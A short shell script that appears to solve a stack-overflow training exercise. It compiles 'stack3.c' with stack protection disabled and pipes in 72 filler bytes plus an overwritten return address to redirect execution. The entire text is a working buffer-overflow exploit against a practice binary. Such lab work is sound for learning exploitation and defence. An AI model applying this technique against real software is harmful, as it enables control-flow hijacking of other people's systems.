#g++ -o stack3 stack3.c -g -Wall -fno-stack-protector
#!/bin/bash
echo `python -c 'print"A"*72 + "\xb6\x05\x40\x00\x00\x00\x00\x00" '` | ./stack3
